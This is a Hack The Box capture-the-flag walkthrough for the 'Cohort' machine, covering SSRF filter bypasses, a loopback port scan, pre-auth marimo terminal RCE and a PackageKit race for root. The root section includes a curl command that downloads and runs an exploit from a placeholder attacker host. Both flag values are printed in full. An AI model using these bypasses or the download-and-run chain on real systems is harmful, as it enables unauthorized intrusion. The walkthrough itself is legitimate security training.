# Walkthrough: Cohort (HTB #933)

**Status: PWNED — user + root, 2026-08-29** ✅

- **Target:** `10.129.244.174` (our own spawned lab instance)
- **Flags:** user `171c42…` · root `8a2301…` (both submitted and accepted;
  full values live in [../flags.log](../flags.log))
- **Attack chain in one sentence:** an SSRF in a report-validation API let us
  port-scan the box's own loopback, discover a hidden marimo notebook behind a
  vhost, get shell through a pre-auth terminal bug, then root through a
  PackageKit race that installs a malicious `.deb`.

---

## Setting the scene: what is this box?

The target presents itself as **"Cohort Analytics"** — a fictional marketing
dashboard plus a **"Client Insights"** portal where you register external report
URLs for the server to fetch and preview. It's a custom SPA, not a real product;
the obfuscated JavaScript and AES-encrypted client bundle are box flavor to hide
the real attack surface.

The stack, as fingerprinted:

| Layer | What we found |
|---|---|
| Web server | **nginx 1.24.0** (Ubuntu) — reverse proxy on 443 |
| Backend API | **Python stdlib `http.server`** — custom handler behind nginx (501 on `OPTIONS` gave it away) |
| Client | Vanilla JS SPA; `/assets/app.js` obfuscated + AES-256-GCM encrypted payload |
| SSH | OpenSSH 9.6p1 on port 22 — the usual "if we find creds, try here" door |

**Auth model:** none. No login, no cookies, no rate limiting. The portal is fully
open — which means the only gate is "can you abuse what the server fetches for you?"

The one endpoint that matters:

| Path | Method | Role |
|---|---|---|
| `/api/validate` | POST | JSON `{"url", "format"}` — server fetches `url`, reflects full body in `preview` |

Everything else (`/robots.txt`, `/.env`, `/graphql`, …) returns the same 908-byte
SPA shell — nginx fallback masks the map. Don't waste time fuzzing thousands of
paths; the SSRF is the front door.

---

## SSRF filter bypasses — explained simply

`/api/validate` is a **Server-Side Request Forgery (SSRF)** gadget: you hand the
server a URL, and it fetches it *from inside the network*, then shows you the
response. The filter tries to block "internal" addresses with the message
*"Internal or loopback addresses are not permitted."*

What it actually blocks:

- `127.0.0.1`, `localhost`, `[::1]`

What still works — and why:

| Bypass | Example | Plain English |
|---|---|---|
| **Alternate loopback spellings** | `http://0.0.0.0/` | `0.0.0.0` means "this machine" to the OS, but the filter only blacklisted `127.0.0.1`. Same building, different street sign. |
| **Decimal IP** | `http://2130706433/` | `2130706433` is just `127.0.0.1` written as one big number. The filter checked strings, not math. |
| **Redirect follow** | Your server returns 302 → `http://127.0.0.1:…` | The filter inspects the *first* URL you submit. The fetcher happily follows redirects to anywhere. You hand the bouncer a valid ticket, then the ticket redirects inside. |
| **RFC1918 not blocked** | `http://10.129.x.x:port/` | Internal lab IPs aren't on the blocklist — you can hit other services on the box's own network segment directly. |
| **Hostname without DNS check** | `http://nb-….cohort.htb/` | The filter doesn't resolve hostnames. Any `*.cohort.htb` name sails through *with the correct `Host` header*, so nginx routes you to the right vhost on loopback. |

Other constraints worth knowing:

- Schemes: **http/https only** (`"Only http and https sources are supported."`)
- Fetcher fingerprint: `User-Agent: CohortInsights/1.0`, Python `urllib` style, follows redirects, ~15 s timeout to external (no internet egress → 504)
- `preview` returns the **full response body** — no truncation at 4 KB tested. Perfect for port-scanning and reading internal apps.

The client bundle's "secret" AES key is cosmetic — hardcoded in `app.js`. Interesting
for completeness, but the SSRF is the real foothold.

---

## Loopback scan — knocking on internal doors

With `http://0.0.0.0:<port>/` we turned the validator into a loopback port scanner.
Open ports return a real HTTP status and body in `preview`; closed ports fail fast
with different timing and `fetched_status`.

```bash
# Concept — POST /api/validate with TLS resolve pinning:
curl -sk --resolve cohort.htb:443:10.129.244.174 \
  -X POST https://cohort.htb/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://0.0.0.0:8888/","format":"json"}'
```

Hits that mattered:

| Port | What's there |
|---|---|
| **80 / 443** | nginx (expected) |
| **5000** | Python insights API |
| **8888** | **marimo 0.20.4** — a notebook/web IDE |

The nginx **loopback-only** `/status` page (reachable via SSRF) leaked the upstream
map: hidden vhost **`nb-1be3782a8afd3ad5.cohort.htb`** → `127.0.0.1:8888`. Wildcard
cert `*.cohort.htb` confirms the vhost pattern — random subdomain names, not
guessable from the outside, but the status page handed us the exact hostname.

---

## marimo vhost + terminal RCE (CVE-2026-39987)

**marimo** is a Python notebook environment with a web UI. Version **0.20.4** on
this box exposes `/terminal/ws` **without calling `validate_auth()`** — a pre-auth
WebSocket terminal. CVE-2026-39987.

nginx on the hidden vhost proxies WebSocket upgrades to marimo on loopback. We
don't need `/etc/hosts` entries: fetch through the validator with
`http://nb-1be3782a8afd3ad5.cohort.htb/…` (filter allows the hostname; nginx
routes on `Host`), or patch `getaddrinfo` in an exploit script to resolve the vhost
to the box IP for a direct WebSocket client.

Exploit tooling: [../boxes/cohort/loot/marimo_term_exploit.py](../boxes/cohort/loot/marimo_term_exploit.py)

```bash
python3 marimo_term_exploit.py   # connects to /terminal/ws, drops a shell
```

Shell lands as **marimo** (uid 1000). Foothold achieved — no SSH creds needed.

---

## User flag

```bash
cat /home/marimo/user.txt
# 171c42feba41aac0107509687fef9de3   → submitted, accepted ✅
```

Masked for notes: `171c42…`

---

## Root — PackageKit Pack2TheRoot (CVE-2026-41651)

### Enumeration

- **No sudo** for marimo; standard SUID binaries only
- **sysmon** + **laurel** audit logging present — noisy environment, but not the privesc vector
- **`packagekit` 1.2.8-2ubuntu1.2** installed — `pkcon --version` → **1.2.8**, inside vulnerable range **1.0.2–1.3.4**

### What the bug is, in plain English

PackageKit is the system service that installs and updates packages on Ubuntu.
**CVE-2026-41651** ("Pack2TheRoot") is a **TOCTOU race**: two overlapping
`InstallFiles` D-Bus calls can bypass the SIMULATE safety check, overwrite flags,
and trick **dpkg** into installing a malicious `.deb` — one that drops a **SUID
bash** in `/tmp`.

Think of it as two clerks processing the same shipment: the first says "just a
dry run," the second swaps the label before the warehouse actually installs —
and the warehouse installs your package with root privileges.

### The exploit

Public exploit: [Vozec/CVE-2026-41651](https://github.com/Vozec/CVE-2026-41651)

From the marimo shell, pull and run:

```bash
curl http://<attacker>:8897/cve-2026-41651 -o /tmp/exploit
chmod +x /tmp/exploit && /tmp/exploit
# ~3 seconds later: SUID bash at /tmp/.suid_bash

/tmp/.suid_bash -p -c 'cat /root/root.txt'
# 8a23019480f89f1d845adb95d3948ea8   → submitted, accepted ✅  machine_pwned: true
```

Masked for notes: `8a2301…`

---

## Lessons to remember

> 1. **SSRF filters are string games — enumerate bypasses early.** Decimal IPs,
>    `0.0.0.0`, redirects, and unvalidated hostnames beat naive blocklists. When
>    you see "loopback not permitted," ask *how* they check, not *what* they block.
> 2. **SSRF + full body reflection = internal port scanner + file reader.** Response
>    time, `fetched_status`, and `preview` content distinguish open ports and leak
>    internal apps without touching the firewall from outside.
> 3. **Vhosts on loopback hide the real apps.** External nginx is a reception desk;
>    `/status`, SSRF hostname tricks, and wildcard certs tell you which subdomain
>    names unlock internal services.
> 4. **Pre-auth WebSocket endpoints are RCE.** A terminal socket without auth behind
>    a reverse proxy is a root-equivalent mistake waiting for the right vhost name.
> 5. **Version fingerprinting again.** `pkcon --version` → 1.2.8 mapped straight to
>    a published PackageKit race with a public exploit — enumerate packages before
>    chasing SUID rabbits.
> 6. **Audit logging doesn't stop privesc.** sysmon and laurel watched everything;
>    the win was a deterministic D-Bus race, not stealth.

---

## Appendix: submitting flags via the HTB API

```bash
curl -X POST https://labs.hackthebox.com/api/v5/machine/own \
     -H "Authorization: Bearer $HTB_TOKEN" -H "Content-Type: application/json" \
     -d '{"id":933,"flag":"<flag>","difficulty":10}'
# → "Cohort user/root is now owned."
```
